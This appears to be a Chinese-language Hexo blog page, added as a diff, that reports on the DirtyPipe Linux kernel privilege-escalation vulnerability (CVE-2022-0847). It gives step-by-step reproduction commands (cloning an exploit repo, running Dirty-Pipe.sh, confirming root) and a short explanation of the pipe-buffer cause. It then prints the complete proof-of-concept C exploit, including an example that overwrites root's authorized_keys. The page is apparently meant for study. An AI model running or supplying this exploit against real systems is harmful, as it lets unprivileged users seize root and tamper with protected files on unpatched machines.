@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DirtyPipe漏洞报告 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="DirtyPipe CVE-2022-0847漏洞类型：内核提权漏洞
+描述：可以覆盖任意只读文件中的数据，并获得 root 权限。
+漏洞影响范围：5.8 &amp;lt;&amp;#x3D; Linux 内核版本 ,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="DirtyPipe漏洞报告 - Hexo"/>
+    <meta name="twitter:description" content="DirtyPipe CVE-2022-0847漏洞类型：内核提权漏洞
+描述：可以覆盖任意只读文件中的数据，并获得 root 权限。
+漏洞影响范围：5.8 &amp;lt;&amp;#x3D; Linux 内核版本 ,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="DirtyPipe漏洞报告 - Hexo"/>
+    <meta property="og:description" content="DirtyPipe CVE-2022-0847漏洞类型：内核提权漏洞
+描述：可以覆盖任意只读文件中的数据，并获得 root 权限。
+漏洞影响范围：5.8 &amp;lt;&amp;#x3D; Linux 内核版本 ,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">DirtyPipe漏洞报告</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">DirtyPipe漏洞报告</h1>
+        <div class="stuff">
+            <span>三月 11, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="DirtyPipe-CVE-2022-0847"><a href="#DirtyPipe-CVE-2022-0847" class="headerlink" title="DirtyPipe CVE-2022-0847"></a>DirtyPipe CVE-2022-0847</h1><p>漏洞类型：内核提权漏洞</p>
+<p>描述：可以覆盖任意只读文件中的数据，并获得 root 权限。</p>
+<p>漏洞影响范围：5.8 &lt;&#x3D; Linux 内核版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102</p>
+<p>复现环境：5.10.0-kali3-amd64</p>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/WWL0814/article/details/123354623">https://blog.csdn.net/WWL0814/article/details/123354623</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/imfiver/CVE-2022-0847">https://github.com/imfiver/CVE-2022-0847</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用Dirty-Pipe.sh文件进行提权</p>
+<p>下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/imfiver/CVE-2022-0847">https://github.com/imfiver/CVE-2022-0847</a></p>
+<p>复现步骤</p>
+<p>登录kali普通用户账号，查看下用户</p>
+<p>whoami</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310111434.png" alt="20220310111434"></p>
+<p>打开终端下载文件</p>
+<pre><code>git clone https://github.com/imfiver/CVE-2022-0847.git
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310110908.png" alt="20220310110908"></p>
+<p>进入文件目录</p>
+<pre><code>cd CVE-2022-0847
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310111112.png" alt="20220310111112"></p>
+<p>查看下目录中内容</p>
+<pre><code>ls
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310111203.png" alt="20220310111203"></p>
+<p>运行Dirty-Pipe.sh文件</p>
+<pre><code>bash Dirty-Pipe.sh
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310111254.png" alt="20220310111254"></p>
+<p>可以看到已经进入root了，用whoami看看</p>
+<pre><code>whoami
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220310111336.png" alt="20220310111336"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/murphysec/article/details/123382564">https://blog.csdn.net/murphysec/article/details/123382564</a></p>
+<p><a target="_blank" rel="noopener" href="https://netsecurity.51cto.com/article/703539.html">https://netsecurity.51cto.com/article/703539.html</a></p>
+<p>linux重构了匿名管道缓冲区的代码，修改了“可合并”检查的逻辑。“可合并”检查逻辑修改前，pipe_buf_can_merge方法对管道缓冲区的操作进行了判断，管道缓冲区的合并是有条件的。“可合并”检查逻辑修改后，PIPE_BUF_FLAG_CAN_MERGE 是固定值，即默认合并管道缓冲区的内容。</p>
+<p>漏洞POC</p>
+<p>&#x2F;* SPDX-License-Identifier: GPL-2.0 <em>&#x2F;<br>&#x2F;</em></p>
+<ul>
+<li>Copyright 2022 CM4all GmbH &#x2F; IONOS SE</li>
+<li></li>
+<li>author: Max Kellermann <a href="mailto:&#x6d;&#x61;&#x78;&#x2e;&#x6b;&#101;&#x6c;&#108;&#x65;&#114;&#x6d;&#x61;&#110;&#110;&#64;&#105;&#111;&#x6e;&#111;&#115;&#46;&#99;&#x6f;&#109;">&#x6d;&#x61;&#x78;&#x2e;&#x6b;&#101;&#x6c;&#108;&#x65;&#114;&#x6d;&#x61;&#110;&#110;&#64;&#105;&#111;&#x6e;&#111;&#115;&#46;&#99;&#x6f;&#109;</a></li>
+<li></li>
+<li>Proof-of-concept exploit for the Dirty Pipe</li>
+<li>vulnerability (CVE-2022-0847) caused by an uninitialized</li>
+<li>“pipe_buffer.flags” variable.  It demonstrates how to overwrite any</li>
+<li>file contents in the page cache, even if the file is not permitted</li>
+<li>to be written, immutable or on a read-only mount.</li>
+<li></li>
+<li>This exploit requires Linux 5.8 or later; the code path was made</li>
+<li>reachable by commit f6dd975583bd (“pipe: merge</li>
+<li>anon_pipe_buf*_ops”).  The commit did not introduce the bug, it was</li>
+<li>there before, it just provided an easy way to exploit it.</li>
+<li></li>
+<li>There are two major limitations of this exploit: the offset cannot</li>
+<li>be on a page boundary (it needs to write one byte before the offset</li>
+<li>to add a reference to this page to the pipe), and the write cannot</li>
+<li>cross a page boundary.</li>
+<li></li>
+<li>Example: .&#x2F;write_anything &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 1 $’\nssh-ed25519 AAA……\n’</li>
+<li></li>
+<li>Further explanation: <a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></li>
+</ul>
+<p> *&#x2F;</p>
+<p>#define _GNU_SOURCE<br>#include &lt;unistd.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys&#x2F;stat.h&gt;<br>#include &lt;sys&#x2F;user.h&gt;</p>
+<p>#ifndef PAGE_SIZE<br>#define PAGE_SIZE 4096<br>#endif</p>
+<p>&#x2F;**</p>
+<ul>
+<li>Create a pipe where all “bufs” on the pipe_inode_info ring have the</li>
+<li>PIPE_BUF_FLAG_CAN_MERGE flag set.</li>
+</ul>
+<p> *&#x2F;<br>static void prepare_pipe(int p[2])<br>{<br>  if (pipe(p)) abort();</p>
+<p>  const unsigned pipe_size &#x3D; fcntl(p[1], F_GETPIPE_SZ);<br>  static char buffer[4096];</p>
+<p>  &#x2F;* fill the pipe completely; each pipe_buffer will now have<br>     the PIPE_BUF_FLAG_CAN_MERGE flag *&#x2F;<br>  for (unsigned r &#x3D; pipe_size; r &gt; 0;) {<br>    unsigned n &#x3D; r &gt; sizeof(buffer) ? sizeof(buffer) : r;<br>    write(p[1], buffer, n);<br>    r -&#x3D; n;<br>  }</p>
+<p>  &#x2F;* drain the pipe, freeing all pipe_buffer instances (but<br>     leaving the flags initialized) *&#x2F;<br>  for (unsigned r &#x3D; pipe_size; r &gt; 0;) {<br>    unsigned n &#x3D; r &gt; sizeof(buffer) ? sizeof(buffer) : r;<br>    read(p[0], buffer, n);<br>    r -&#x3D; n;<br>  }</p>
+<p>  &#x2F;* the pipe is now empty, and if somebody adds a new<br>     pipe_buffer without initializing its “flags”, the buffer<br>     will be mergeable *&#x2F;<br>}</p>
+<p>int main(int argc, char **argv)<br>{<br>  if (argc !&#x3D; 4) {<br>    fprintf(stderr, “Usage: %s TARGETFILE OFFSET DATA\n”, argv[0]);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  &#x2F;* dumb command-line argument parser *&#x2F;<br>  const char *const path &#x3D; argv[1];<br>  loff_t offset &#x3D; strtoul(argv[2], NULL, 0);<br>  const char *const data &#x3D; argv[3];<br>  const size_t data_size &#x3D; strlen(data);</p>
+<p>  if (offset % PAGE_SIZE &#x3D;&#x3D; 0) {<br>    fprintf(stderr, “Sorry, cannot start writing at a page boundary\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  const loff_t next_page &#x3D; (offset | (PAGE_SIZE - 1)) + 1;<br>  const loff_t end_offset &#x3D; offset + (loff_t)data_size;<br>  if (end_offset &gt; next_page) {<br>    fprintf(stderr, “Sorry, cannot write across a page boundary\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  &#x2F;* open the input file and validate the specified offset *&#x2F;<br>  const int fd &#x3D; open(path, O_RDONLY); &#x2F;&#x2F; yes, read-only! :-)<br>  if (fd &lt; 0) {<br>    perror(“open failed”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  struct stat st;<br>  if (fstat(fd, &amp;st)) {<br>    perror(“stat failed”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  if (offset &gt; st.st_size) {<br>    fprintf(stderr, “Offset is not inside the file\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  if (end_offset &gt; st.st_size) {<br>    fprintf(stderr, “Sorry, cannot enlarge the file\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  &#x2F;* create the pipe with all flags initialized with<br>     PIPE_BUF_FLAG_CAN_MERGE *&#x2F;<br>  int p[2];<br>  prepare_pipe(p);</p>
+<p>  &#x2F;* splice one byte from before the specified offset into the<br>     pipe; this will add a reference to the page cache, but<br>     since copy_page_to_iter_pipe() does not initialize the<br>     “flags”, PIPE_BUF_FLAG_CAN_MERGE is still set *&#x2F;<br>  –offset;<br>  ssize_t nbytes &#x3D; splice(fd, &amp;offset, p[1], NULL, 1, 0);<br>  if (nbytes &lt; 0) {<br>    perror(“splice failed”);<br>    return EXIT_FAILURE;<br>  }<br>  if (nbytes &#x3D;&#x3D; 0) {<br>    fprintf(stderr, “short splice\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  &#x2F;* the following write will not create a new pipe_buffer, but<br>     will instead write into the page cache, because of the<br>     PIPE_BUF_FLAG_CAN_MERGE flag *&#x2F;<br>  nbytes &#x3D; write(p[1], data, data_size);<br>  if (nbytes &lt; 0) {<br>    perror(“write failed”);<br>    return EXIT_FAILURE;<br>  }<br>  if ((size_t)nbytes &lt; data_size) {<br>    fprintf(stderr, “short write\n”);<br>    return EXIT_FAILURE;<br>  }</p>
+<p>  printf(“It worked!\n”);<br>  return EXIT_SUCCESS;<br>}</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
